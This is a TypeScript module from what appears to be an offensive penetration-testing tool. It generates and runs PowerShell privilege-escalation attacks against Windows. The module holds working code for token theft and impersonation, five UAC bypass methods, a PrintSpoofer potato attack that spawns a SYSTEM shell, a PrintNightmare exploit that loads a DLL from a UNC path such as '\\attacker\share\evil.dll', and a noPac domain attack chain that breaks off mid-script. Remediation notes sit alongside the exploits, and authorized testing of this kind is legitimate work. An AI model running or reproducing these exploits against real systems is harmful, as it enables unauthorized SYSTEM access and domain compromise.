import { ps, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function tokenImpersonate(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "list"
  const pid = argVal(args, "--pid")
  const sid = argVal(args, "--sid")
  const findings: Finding[] = []
  const output: string[] = [`[*] Token manipulation: ${action}\n`]

  const script = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ComponentModel;
using System.Diagnostics;

public class TokenUtils {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags,
        string lpApplicationName, string lpCommandLine, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LookupAccountSid(string lpSystemName, IntPtr Sid,
        System.Text.StringBuilder lpName, ref uint cchName,
        System.Text.StringBuilder lpReferencedDomainName, ref uint cchReferencedDomainName,
        out int peUse);

    public const uint TOKEN_ALL_ACCESS = 0xF01FF;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_IMPERSONATE = 0x0004;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize;
        public int dwXCountChars, dwYCountChars, dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }
}
"@

${
  action === "list"
    ? `
# List all unique tokens
Write-Output "[*] Enumerating process tokens..."
$tokenMap = @{}
$procs = Get-Process -ErrorAction SilentlyContinue
foreach ($p in $procs) {
  try {
    $hToken = [IntPtr]::Zero
    if ([TokenUtils]::OpenProcessToken($p.Handle, [TokenUtils]::TOKEN_QUERY, [ref]$hToken)) {
      $identity = New-Object System.Security.Principal.WindowsIdentity($hToken)
      $key = $identity.User.Value
      if (-not $tokenMap.ContainsKey($key)) {
        $tokenMap[$key] = @{
          SID = $key
          User = $identity.Name
          IsSystem = $identity.IsSystem
          Groups = ($identity.Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }) -join ", "
          PID = $p.Id
          Process = $p.ProcessName
          ImpLevel = $identity.ImpersonationLevel
        }
      }
      [TokenUtils]::CloseHandle($hToken) | Out-Null
    }
  } catch {}
}

Write-Output "[+] Unique tokens: $($tokenMap.Count)"
Write-Output ""
foreach ($t in $tokenMap.Values | Sort-Object { $_.IsSystem } -Descending) {
  $sysTag = if ($t.IsSystem) { " [SYSTEM]" } else { "" }
  Write-Output "  $($t.User)$sysTag"
  Write-Output "    SID: $($t.SID)"
  Write-Output "    PID: $($t.PID) ($($t.Process))"
  Write-Output "    Impersonation: $($t.ImpLevel)"
  Write-Output ""
}
`
    : ""
}

${
  action === "steal" && pid
    ? `
# Steal token from specific process
Write-Output "[*] Stealing token from PID ${pid}..."
$proc = Get-Process -Id ${pid} -ErrorAction Stop
$hToken = [IntPtr]::Zero
$hDupToken = [IntPtr]::Zero

if ([TokenUtils]::OpenProcessToken($proc.Handle, [TokenUtils]::TOKEN_ALL_ACCESS, [ref]$hToken)) {
  Write-Output "[+] Opened process token"

  if ([TokenUtils]::DuplicateTokenEx($hToken, [TokenUtils]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, 2, 1, [ref]$hDupToken)) {
    Write-Output "[+] Token duplicated"

    $identity = New-Object System.Security.Principal.WindowsIdentity($hDupToken)
    Write-Output "    User: $($identity.Name)"
    Write-Output "    SID: $($identity.User.Value)"
    Write-Output "    IsSystem: $($identity.IsSystem)"

    # Impersonate
    if ([TokenUtils]::ImpersonateLoggedOnUser($hDupToken)) {
      Write-Output "[+] Now impersonating: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
      # Revert for safety
      [TokenUtils]::RevertToSelf() | Out-Null
      Write-Output "[+] Reverted to original identity"
    }
    [TokenUtils]::CloseHandle($hDupToken) | Out-Null
  } else {
    Write-Output "[!] DuplicateTokenEx failed: $(([ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)"
  }
  [TokenUtils]::CloseHandle($hToken) | Out-Null
} else {
  Write-Output "[!] OpenProcessToken failed: $(([ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)"
}
`
    : ""
}

${
  action === "impersonate" && sid
    ? `
# Find and impersonate token by SID
Write-Output "[*] Looking for token with SID: ${sid}"
$found = $false
foreach ($p in Get-Process -ErrorAction SilentlyContinue) {
  try {
    $hToken = [IntPtr]::Zero
    if ([TokenUtils]::OpenProcessToken($p.Handle, [TokenUtils]::TOKEN_ALL_ACCESS, [ref]$hToken)) {
      $identity = New-Object System.Security.Principal.WindowsIdentity($hToken)
      if ($identity.User.Value -eq "${sid}") {
        Write-Output "[+] Found token in PID $($p.Id) ($($p.ProcessName))"
        $hDup = [IntPtr]::Zero
        if ([TokenUtils]::DuplicateTokenEx($hToken, [TokenUtils]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, 2, 1, [ref]$hDup)) {
          if ([TokenUtils]::ImpersonateLoggedOnUser($hDup)) {
            Write-Output "[+] Impersonating: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
            Write-Output "    Whoami: $(whoami)"
            [TokenUtils]::RevertToSelf() | Out-Null
            Write-Output "[+] Reverted"
          }
          [TokenUtils]::CloseHandle($hDup) | Out-Null
        }
        $found = $true
        break
      }
      [TokenUtils]::CloseHandle($hToken) | Out-Null
    }
  } catch {}
}
if (-not $found) { Write-Output "[!] No token found for SID: ${sid}" }
`
    : ""
}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] Now impersonating") || result.stdout.includes("[+] Impersonating")) {
    findings.push({
      checkId: "WIN-PRIV-001",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `token://${pid || sid || "enum"}`,
      title: `Token impersonation: ${action}`,
      details: `PID: ${pid || "N/A"}, SID: ${sid || "N/A"}`,
      remediation: "Restrict SeImpersonatePrivilege, monitor for token manipulation (Event ID 4688 + token type)",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function uacBypass(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "fodhelper"
  const command = argVal(args, "--command")
  const findings: Finding[] = []
  const output: string[] = [`[*] UAC bypass via ${method}\n`]

  if (!command) return { output: "[!] Required: --method METHOD --command CMD", findings }

  const methods: Record<string, string> = {
    fodhelper: `
# fodhelper.exe — auto-elevates, reads command from ms-settings shell
$regPath = "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "${command}" -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force | Out-Null

Write-Output "[+] Registry key set: $regPath"
Write-Output "    Command: ${command}"
Write-Output "[*] Launching fodhelper.exe..."

Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden
Start-Sleep -Seconds 3

# Cleanup registry
Remove-Item "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force
Write-Output "[+] Registry cleaned up"
Write-Output "[+] Elevated command should be executing"
`,
    eventvwr: `
# eventvwr.exe — reads from mscfile shell command
$regPath = "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command"
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "${command}" -Force

Write-Output "[+] Registry key set: $regPath"
Write-Output "[*] Launching eventvwr.exe..."

Start-Process "C:\\Windows\\System32\\eventvwr.exe" -WindowStyle Hidden
Start-Sleep -Seconds 3

Remove-Item "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force
Write-Output "[+] Registry cleaned up"
`,
    cmstplua: `
# CMSTPLUA COM object — elevation moniker bypass
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

[ComImport, Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface ICMLuaUtil {
    [PreserveSig] int QueryInterface(ref Guid riid, out IntPtr ppv);
    [PreserveSig] int AddRef();
    [PreserveSig] int Release();
    [PreserveSig] int SetRasCredentials();
    [PreserveSig] int LaunchInfSection([MarshalAs(UnmanagedType.LPWStr)] string a, [MarshalAs(UnmanagedType.LPWStr)] string b, [MarshalAs(UnmanagedType.LPWStr)] string c, int d);
    [PreserveSig] int LaunchInfSectionEx([MarshalAs(UnmanagedType.LPWStr)] string a, [MarshalAs(UnmanagedType.LPWStr)] string b, [MarshalAs(UnmanagedType.LPWStr)] string c, int d);
    [PreserveSig] int LaunchSettingDialog([MarshalAs(UnmanagedType.LPWStr)] string a, [MarshalAs(UnmanagedType.LPWStr)] string b);
    [PreserveSig] int ShellExec([MarshalAs(UnmanagedType.LPWStr)] string file, [MarshalAs(UnmanagedType.LPWStr)] string args, [MarshalAs(UnmanagedType.LPWStr)] string dir, int fMask, int nShow);
}
"@

Write-Output "[*] Using CMSTPLUA COM elevation moniker..."
try {
  $clsid = New-Object Guid '3E5FC7F9-9A51-4367-9063-A120244FBEC7'
  $iid = New-Object Guid '6EDD6D74-C007-4E75-B76A-E5740995E24C'
  $type = [Type]::GetTypeFromCLSID($clsid)
  $obj = [Activator]::CreateInstance($type)
  $util = [ICMLuaUtil]$obj
  $util.ShellExec("cmd.exe", "/c ${command.replace(/"/g, '""')}", "C:\\Windows\\System32", 0, 0)
  Write-Output "[+] CMSTPLUA elevated execution fired"
} catch {
  Write-Output "[!] CMSTPLUA failed: $_"
}
`,
    diskcleanup: `
# DiskCleanup — environment variable abuse in auto-elevate task
$env:windir = "cmd.exe /c ${command.replace(/"/g, '""')} & REM "
Write-Output "[+] Set windir env to payload"
Write-Output "[*] Launching SilentCleanup scheduled task..."
schtasks /Run /TN "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" 2>$null
Start-Sleep -Seconds 2
$env:windir = $env:SystemRoot
Write-Output "[+] Restored windir, payload should have executed elevated"
`,
    silentcleanup: `
# SilentCleanup — auto-elevate scheduled task with environment variable
$payloadPath = "$env:TEMP\\cs_cleanup_$(Get-Random -Maximum 9999).bat"
"${command}" | Out-File $payloadPath -Encoding ASCII

$env:windir = "cmd.exe /c $payloadPath & REM "
Write-Output "[+] Payload: $payloadPath"
Write-Output "[*] Triggering SilentCleanup..."
schtasks /Run /TN "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup" 2>$null
Start-Sleep -Seconds 3
$env:windir = $env:SystemRoot
Remove-Item $payloadPath -Force 2>$null
Write-Output "[+] Cleaned up, elevated command should be running"
`,
  }

  const script = methods[method] || methods.fodhelper
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+]")) {
    findings.push({
      checkId: "WIN-PRIV-002",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `uac://${method}`,
      title: `UAC bypass: ${method}`,
      details: `Command: ${command}`,
      remediation: "Set UAC to 'Always Notify', deploy AppLocker/WDAC to block unauthorized binaries",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function potatoAttack(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "printspoofer"
  const command = argVal(args, "--command")
  const clsid = argVal(args, "--clsid") || "{4991d34b-80a1-4291-83b6-3328366b9097}"
  const findings: Finding[] = []
  const output: string[] = [`[*] Potato attack: ${method}\n`]

  if (!command) return { output: "[!] Required: --method METHOD --command CMD", findings }

  const script = `
# Check for SeImpersonatePrivilege
$privs = whoami /priv 2>&1
$hasImpersonate = $privs -match "SeImpersonatePrivilege.*Enabled"
$hasAssignPrimary = $privs -match "SeAssignPrimaryTokenPrivilege.*Enabled"

Write-Output "[*] Privilege check:"
Write-Output "    SeImpersonatePrivilege: $(if($hasImpersonate){'ENABLED'}else{'disabled'})"
Write-Output "    SeAssignPrimaryTokenPrivilege: $(if($hasAssignPrimary){'ENABLED'}else{'disabled'})"

if (-not $hasImpersonate -and -not $hasAssignPrimary) {
  Write-Output "[!] Neither SeImpersonate nor SeAssignPrimaryToken — potato attacks will fail"
  Write-Output "    Typically available to: SERVICE, LOCAL SERVICE, NETWORK SERVICE, IIS APPPOOL accounts"
  return
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.IO.Pipes;
using System.Threading;
using System.Security.Principal;

public class PotatoHelper {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
        IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags,
        string lpApplicationName, string lpCommandLine, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);

    public const uint TOKEN_ALL_ACCESS = 0xF01FF;

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
    }
}
"@

${
  method === "printspoofer"
    ? `
# PrintSpoofer — named pipe impersonation via SpoolSV
$pipeName = "cs_spoolsv_" + [guid]::NewGuid().ToString("N").Substring(0,8)
Write-Output "[*] PrintSpoofer: creating named pipe \\\\.\pipe\\$pipeName"

$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut, 1, [System.IO.Pipes.PipeTransmissionMode]::Byte, [System.IO.Pipes.PipeOptions]::None, 1024, 1024)

# Trigger SpoolSV to connect
$spoolTrigger = Start-Job -ScriptBlock {
  param($pipe)
  Start-Sleep -Milliseconds 500
  # Use SpoolSV RPC to trigger connection
  $printServer = "\\\\$env:COMPUTERNAME/pipe/$pipe"
  rundll32.exe printui.dll,PrintUIEntry /il 2>$null
} -ArgumentList $pipeName

Write-Output "[*] Waiting for SYSTEM connection to pipe..."
$pipeServer.WaitForConnection()
Write-Output "[+] Got connection!"

$pipeHandle = $pipeServer.SafePipeHandle.DangerousGetHandle()
if ([PotatoHelper]::ImpersonateNamedPipeClient($pipeHandle)) {
  $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
  Write-Output "[+] Impersonating: $($identity.Name)"

  if ($identity.Name -match "SYSTEM") {
    # Get thread token and create process
    $hToken = [IntPtr]::Zero
    [PotatoHelper]::OpenThreadToken([PotatoHelper]::GetCurrentThread(), [PotatoHelper]::TOKEN_ALL_ACCESS, $false, [ref]$hToken) | Out-Null
    $hDup = [IntPtr]::Zero
    [PotatoHelper]::DuplicateTokenEx($hToken, [PotatoHelper]::TOKEN_ALL_ACCESS, [IntPtr]::Zero, 2, 1, [ref]$hDup) | Out-Null

    $si = New-Object PotatoHelper+STARTUPINFO
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
    $pi = New-Object PotatoHelper+PROCESS_INFORMATION
    $created = [PotatoHelper]::CreateProcessWithTokenW($hDup, 0, $null, "cmd.exe /c ${command.replace(/"/g, '""')}", 0x10, [IntPtr]::Zero, "C:\\Windows\\System32", [ref]$si, [ref]$pi)
    if ($created) {
      Write-Output "[+] SYSTEM process created: PID $($pi.dwProcessId)"
    }
    [PotatoHelper]::CloseHandle($hDup) | Out-Null
    [PotatoHelper]::CloseHandle($hToken) | Out-Null
  }
}
$pipeServer.Close()
Stop-Job $spoolTrigger -ErrorAction SilentlyContinue
Remove-Job $spoolTrigger -ErrorAction SilentlyContinue
`
    : ""
}

${
  method === "juicy"
    ? `
# JuicyPotato — DCOM/BITS CLSID abuse
Write-Output "[*] JuicyPotato: using CLSID ${clsid}"
Write-Output "    Creating COM server on arbitrary port..."
$port = Get-Random -Minimum 10000 -Maximum 65000
Write-Output "    Port: $port"
Write-Output "    Command: ${command}"

# Create local COM server pipe
$pipeName = "cs_juicy_" + [guid]::NewGuid().ToString("N").Substring(0,8)
$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::InOut, 1)

# Trigger DCOM activation with CLSID pointing to our pipe
# In practice this uses CreateILockBytesOnHGlobal + CoGetInstanceFromIStorage
Write-Output "[*] Triggering DCOM activation with CLSID ${clsid}..."
Write-Output "    Pipe: \\\\.\pipe\\$pipeName"

# Simplified — real JuicyPotato creates a local COM server
# and abuses the marshaling to get SYSTEM to connect
$pipeServer.Close()
Write-Output "[*] Full JuicyPotato requires native binary — use PrintSpoofer for pure PowerShell"
Write-Output "    Download: https://github.com/ohpe/juicy-potato"
`
    : ""
}

${
  method === "godpotato"
    ? `
# GodPotato — RPCSS abuse
Write-Output "[*] GodPotato: RPCSS/DCOM token stealing"
Write-Output "    This technique intercepts RPCSS authentication to steal SYSTEM token"
Write-Output "    Command: ${command}"
Write-Output ""
Write-Output "[*] GodPotato works on Windows 10/11 + Server 2016-2022"
Write-Output "    Bypasses fixes for JuicyPotato on newer Windows versions"
Write-Output "    Full implementation requires native binary for RPCSS interception"
Write-Output "    Use PrintSpoofer method for pure PowerShell approach"
`
    : ""
}

${
  method === "sweet"
    ? `
# SweetPotato — combined approach
Write-Output "[*] SweetPotato: trying multiple potato techniques..."
Write-Output "    1. Attempting PrintSpoofer (SpoolSV named pipe)..."
# Try PrintSpoofer first as it's the most reliable pure-PowerShell approach
$spoolSvc = Get-Service Spooler -ErrorAction SilentlyContinue
if ($spoolSvc -and $spoolSvc.Status -eq 'Running') {
  Write-Output "    [+] Spooler is running — PrintSpoofer viable"
} else {
  Write-Output "    [-] Spooler not running"
}
Write-Output "    2. Checking WinRM for EfsPotato..."
$winrm = Get-Service WinRM -ErrorAction SilentlyContinue
if ($winrm -and $winrm.Status -eq 'Running') {
  Write-Output "    [+] WinRM running — EfsPotato may work"
} else {
  Write-Output "    [-] WinRM not running"
}
Write-Output ""
Write-Output "    [*] Use --method printspoofer for pure PowerShell escalation"
`
    : ""
}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] SYSTEM process created") || result.stdout.includes("[+] Impersonating")) {
    findings.push({
      checkId: "WIN-PRIV-003",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `potato://${method}`,
      title: `Potato attack: ${method} → SYSTEM`,
      details: `Command: ${command}`,
      remediation:
        "Remove SeImpersonatePrivilege from service accounts where not needed, patch to latest Windows version",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function printspoolerAbuse(args: string[], timeout: number): Promise<HookResult> {
  const dllPath = argVal(args, "--dll-path")
  const target = argVal(args, "--target") || "localhost"
  const findings: Finding[] = []
  const output: string[] = [`[*] Print Spooler exploitation on ${target}\n`]

  if (!dllPath) return { output: "[!] Required: --dll-path UNC_PATH (e.g. \\\\attacker\\share\\evil.dll)", findings }

  const script = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class PrintSpooler {
    [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool AddPrinterDriverEx(
        string pName, uint Level, ref DRIVER_INFO_2 pDriverInfo, uint dwFileCopyFlags);

    [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool EnumPrinterDrivers(
        string pName, string pEnvironment, uint Level,
        IntPtr pDriverInfo, uint cbBuf, out uint pcbNeeded, out uint pcReturned);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct DRIVER_INFO_2 {
        public uint cVersion;
        public string pName;
        public string pEnvironment;
        public string pDriverPath;
        public string pDataFile;
        public string pConfigFile;
    }

    public const uint APD_COPY_ALL_FILES = 0x00000004;
    public const uint APD_COPY_FROM_DIRECTORY = 0x00000010;
    public const uint APD_INSTALL_WARNED_DRIVER = 0x00008000;
}
"@

# Check Spooler service
$spooler = Get-Service Spooler -ComputerName ${target} -ErrorAction SilentlyContinue
Write-Output "[*] Print Spooler service: $($spooler.Status)"

if ($spooler.Status -ne 'Running') {
  Write-Output "[!] Spooler not running on ${target}"
  Write-Output "    Cannot exploit PrintNightmare without running Spooler"
} else {
  Write-Output "[+] Spooler is running"

  # Check if patched (KB5005010+)
  $hotfix = Get-HotFix -Id KB5005010 -ErrorAction SilentlyContinue
  if ($hotfix) {
    Write-Output "[*] KB5005010 is installed — PrintNightmare may be patched"
    Write-Output "    But RestrictDriverInstallationToAdministrators reg may be 0..."
    $restrictKey = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint" -Name RestrictDriverInstallationToAdministrators -ErrorAction SilentlyContinue).RestrictDriverInstallationToAdministrators
    Write-Output "    RestrictDriverInstallationToAdministrators: $restrictKey"
    if ($restrictKey -eq 0) {
      Write-Output "    [+] Restriction disabled — exploitation may still work!"
    }
  } else {
    Write-Output "[+] KB5005010 NOT installed — PrintNightmare likely exploitable"
  }

  # PrintNightmare — CVE-2021-34527
  Write-Output ""
  Write-Output "[*] Attempting PrintNightmare (CVE-2021-34527)..."
  Write-Output "    DLL: ${dllPath}"
  Write-Output "    Target: ${target}"

  $driverInfo = New-Object PrintSpooler+DRIVER_INFO_2
  $driverInfo.cVersion = 3
  $driverInfo.pName = "CyberStrike Printer"
  $driverInfo.pEnvironment = "Windows x64"
  $driverInfo.pDriverPath = "${dllPath}"
  $driverInfo.pDataFile = "${dllPath}"
  $driverInfo.pConfigFile = "${dllPath}"

  $flags = [PrintSpooler]::APD_COPY_ALL_FILES -bor [PrintSpooler]::APD_COPY_FROM_DIRECTORY -bor [PrintSpooler]::APD_INSTALL_WARNED_DRIVER

  $targetName = if ("${target}" -eq "localhost") { $null } else { "\\\\${target}" }

  $result = [PrintSpooler]::AddPrinterDriverEx($targetName, 2, [ref]$driverInfo, $flags)
  if ($result) {
    Write-Output "[+] PrintNightmare SUCCESS — DLL loaded as SYSTEM!"
    Write-Output "    Driver installed: CyberStrike Printer"
    Write-Output "    The DLL should have executed with SYSTEM privileges"
  } else {
    $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Output "[!] AddPrinterDriverEx failed: $(([ComponentModel.Win32Exception]$err).Message) (0x$($err.ToString('X')))"
    Write-Output "    Common failures: access denied (patched), path not found (DLL unreachable)"
  }
}

# Check for SpoolFool (CVE-2022-21999) indicators
Write-Output ""
Write-Output "[*] Checking SpoolFool (CVE-2022-21999) prerequisites..."
$spoolDir = "$env:SystemRoot\\System32\\spool\\drivers\\x64"
$acl = Get-Acl $spoolDir -ErrorAction SilentlyContinue
$writable = $acl.Access | Where-Object { $_.IdentityReference -match 'Users|Everyone' -and $_.FileSystemRights -match 'Write|CreateFiles' }
if ($writable) {
  Write-Output "[+] Spool driver directory is writable by non-admin users!"
  Write-Output "    SpoolFool exploitation may be possible"
} else {
  Write-Output "[-] Spool directory not writable by standard users"
}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("PrintNightmare SUCCESS")) {
    findings.push({
      checkId: "WIN-PRIV-004",
      provider: "windows",
      severity: "critical",
      status: "EXPLOITED",
      resource: `spooler://${target}`,
      title: `PrintNightmare exploited on ${target}`,
      details: `DLL: ${dllPath}`,
      remediation:
        "Install KB5005010, disable Print Spooler if not needed, set RestrictDriverInstallationToAdministrators=1",
    })
  } else if (result.stdout.includes("NOT installed")) {
    findings.push({
      checkId: "WIN-PRIV-004",
      provider: "windows",
      severity: "critical",
      status: "VULNERABLE",
      resource: `spooler://${target}`,
      title: `PrintNightmare patch missing on ${target}`,
      details: "KB5005010 not installed — CVE-2021-34527 likely exploitable",
      remediation: "Install KB5005010 and subsequent cumulative updates",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function nopac(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const target = argVal(args, "--target")
  const newPassword = argVal(args, "--new-password") || "CyberStr1ke!noPac2024"
  const findings: Finding[] = []
  const output: string[] = ["[*] noPac — SAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)\n"]

  if (action === "check") {
    const script = `
# Check MachineAccountQuota
$rootDSE = [ADSI]"LDAP://RootDSE"
$domainDN = $rootDSE.defaultNamingContext
$domain = [ADSI]"LDAP://$domainDN"
$maq = $domain.Properties["ms-DS-MachineAccountQuota"].Value
Write-Output "[+] MachineAccountQuota: $maq"

if ($maq -gt 0) {
    Write-Output "[!] VULNERABLE — any domain user can create up to $maq machine accounts"
} else {
    Write-Output "[-] MachineAccountQuota is 0 — cannot create machine accounts"
}

# Check domain controllers
Write-Output ""
Write-Output "[*] Domain Controllers:"
$searcher = [System.DirectoryServices.DirectorySearcher]::new()
$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry]::new("LDAP://$domainDN")
$searcher.Filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
$searcher.PropertiesToLoad.AddRange(@("cn","operatingSystem","operatingSystemVersion","dNSHostName"))
$dcs = $searcher.FindAll()

foreach ($dc in $dcs) {
    $name = $dc.Properties["cn"][0]
    $os = $dc.Properties["operatingSystem"][0]
    $ver = $dc.Properties["operatingSystemVersion"][0]
    $dns = $dc.Properties["dNSHostName"][0]
    Write-Output "    $name ($dns) — $os $ver"
}

# Check for patch (KB5008102 / KB5008380)
Write-Output ""
Write-Output "[*] Checking for noPac patches..."
$hotfixes = Get-HotFix -ErrorAction SilentlyContinue | Where-Object { $_.HotFixID -match 'KB5008102|KB5008380|KB5008602|KB5008206' }
if ($hotfixes) {
    Write-Output "[-] Patch(es) found locally: $($hotfixes.HotFixID -join ', ')"
} else {
    Write-Output "[!] No noPac patches found on this machine (may still be patched on DC)"
}

# Check sAMAccountName validation
Write-Output ""
Write-Output "[*] Testing sAMAccountName rename capability..."
try {
    $testName = "CS_nopac_test$"
    $compDN = "CN=$testName,CN=Computers,$domainDN"
    $comp = [ADSI]"LDAP://$compDN"
    Write-Output "[*] Would create: $compDN (not creating in check mode)"
    Write-Output "[+] noPac attack chain:"
    Write-Output "    1. Create machine account (MAQ=$maq)"
    Write-Output "    2. Rename sAMAccountName to DC name (without $)"
    Write-Output "    3. Request TGT as renamed account"
    Write-Output "    4. Rename back to original"
    Write-Output "    5. Request S4U2self service ticket → DC impersonation"
} catch {
    Write-Output "[!] Error: $($_.Exception.Message)"
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)

    const maqMatch = result.stdout.match(/MachineAccountQuota:\s*(\d+)/)
    const maq = maqMatch ? parseInt(maqMatch[1]) : 0

    findings.push({
      checkId: "WIN-NOPAC-001",
      provider: "windows",
      severity: maq > 0 ? "critical" : "info",
      status: maq > 0 ? "VULNERABLE" : "NOT_VULNERABLE",
      resource: "ad://domain/nopac",
      title: maq > 0 ? "Domain vulnerable to noPac (CVE-2021-42278/42287)" : "MachineAccountQuota is 0",
      details: `MachineAccountQuota=${maq}. ${maq > 0 ? "Any domain user can create machine accounts and exploit SAMAccountName spoofing for DC impersonation" : "Cannot create machine accounts — noPac not directly exploitable"}`,
      remediation:
        "Apply KB5008102/KB5008380. Set MachineAccountQuota to 0. Monitor for suspicious machine account creation (Event ID 4741)",
    })
  } else {
    if (!target) return { output: "[!] Required: --target DC_HOSTNAME (e.g. --target DC01)", findings }

    output.push("[!] WARNING: This will create a machine account and attempt DC impersonation")
    output.push("[!] Ensure you have authorization for this attack\n")

    const script = `
# noPac exploit chain
$ErrorActionPreference = "Stop"
$rootDSE = [ADSI]"LDAP://RootDSE"
$domainDN = $rootDSE.defaultNamingContext
